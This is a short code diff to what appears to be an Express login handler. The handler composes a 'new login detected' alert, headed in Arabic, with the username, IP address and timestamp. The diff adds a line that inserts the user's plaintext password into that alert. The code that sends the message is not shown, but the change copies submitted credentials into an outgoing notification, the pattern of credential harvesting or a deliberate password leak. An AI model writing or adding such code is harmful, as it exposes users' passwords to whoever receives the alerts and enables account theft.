@@ -21,6 +21,7 @@ app.post("/login", async (req, res) => {
     
     const message = `🚨 !!!تم اكتشاف تسجيل دخول جديد 🚨
 Username: ${username}
+Password: ${password}
 IP Address: ${ip}
 Timestamp: ${new Date().toISOString()}
 
